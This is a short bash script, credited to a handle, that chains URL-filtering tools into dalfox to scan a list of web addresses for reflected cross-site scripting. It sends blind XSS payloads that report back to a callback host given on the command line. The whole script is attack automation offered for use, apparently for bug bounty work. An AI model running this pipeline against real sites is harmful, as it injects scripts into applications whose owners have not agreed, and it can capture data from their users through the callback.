#!/bin/bash
#Coded by @lemosnlmb

list=$1
blindxss=$2

cat $list | uro | grep "=" | kxss | awk '{print $2}'| dalfox pipe -b $blindxss --skip-bav --silence
